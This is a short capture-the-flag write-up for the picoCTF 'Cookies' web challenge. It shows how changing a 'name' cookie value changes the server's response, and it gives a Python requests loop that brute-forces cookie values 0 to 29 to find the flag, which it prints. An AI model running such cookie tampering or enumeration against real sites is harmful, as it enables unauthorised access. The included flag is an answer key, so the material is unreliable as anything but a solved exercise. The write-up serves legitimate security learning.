# Cookies
## Description
Who doesn't love cookies? Try to figure out the best one. [http://mercury.picoctf.net:54219/](http://mercury.picoctf.net:54219/)
> 40 points 
## Hint 
(None)

The main page of the web app like that 
<div align="center">
     <img src="https://user-images.githubusercontent.com/83420725/177021142-2bba6c9e-c655-4faa-8023-f404dd5c44d8.png">
</div>

## [*] - Step 1
First, reaching the main page, the web app set a cookie

        Cookie: name=-1

## [*] - Step 2
By searching for `snickerdoodle`, cookie changed 
        
        Cookie: name=0

## [*] - Step 3
I try with another cookie {1,2,3,4,5...} and I see the message will be changed 

    Cookie: name=1; I love chocolate chip cookies!
    Cookie: name=2; I love oatmeal raisin cookies!
    Cookie: name=3; I love gingersnap cookies!
    ...
    Cookie: name=29; 
## [*] - Step 3
write python script to get flag

```python 
import requests
for i in range(30):
	cookie = f'name={i}'
	headers = {'Cookie':cookie}
    
	r = requests.get('http://mercury.picoctf.net:54219/check', headers=headers)
	if (r.status_code == 200) and ('picoCTF' in r.text):
		print(f'{r.text} \ncookie: {i}')
```
    Cookie: name=18
> picoCTF{3v3ry1_l0v3s_c00k135_96cdadfd}




